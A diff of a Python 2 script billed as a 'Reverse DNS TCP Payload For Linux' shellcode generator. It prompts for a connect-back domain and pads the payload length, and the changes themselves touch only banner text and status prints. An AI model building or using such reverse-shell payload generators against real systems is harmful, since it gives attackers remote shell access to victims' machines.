@@ -54,8 +54,8 @@ print """
 
 
 
-print "Hitriy Kotik (Tricky Cat) is my name and I like dealing in shellcode. I have something special in the market place for you! \n\n \
-!!!!! A Reverse DNS TCP Payload For Linux !!!!! \n\n Tell Me , a few things and I will generate the shellcode for you!"  
+print "Hitriy Kotik (Tricky Cat) is my name and I like dealing in shellcode. I have something special in the market place for you! \n\n\
+!!!!! A Reverse DNS TCP Payload For Linux !!!!! \n\nTell Me , a few things and I will generate the shellcode for you!"  
 
 
 domainname = raw_input("[+] Tell Me The Domain You wish To Connect Back To : ")
@@ -81,17 +81,17 @@ lengthOfPayload = 22 + len(domainname.replace(".",""))
 #print "Modulus % of Domain Name  " , (lengthOfPayload  % 4 )
 
 if (lengthOfPayload  % 4) == 0:
-    pass
-    #print "[+] Everything looks good!\n"
+    #pass
+    print "[+] Everything looks good!\n"
 elif (lengthOfPayload  % 4) == 3:
-    #print "[-] Padding With A Byte \n"
+    print "[-] Padding With A Byte \n"
     Suffix.append('00')
 elif (lengthOfPayload  % 4) == 2:
-    #print "[-] Padding With 2  Bytes \n"
+    print "[-] Padding With 2  Bytes \n"
     Suffix.append('00')
     Suffix.append('00')
 elif (lengthOfPayload  % 4) == 1:
-    #print "[-] Padding With 3  Bytes \n"
+    print "[-] Padding With 3  Bytes \n"
     Suffix.append('00')
     Suffix.append('00')
     Suffix.append('00')
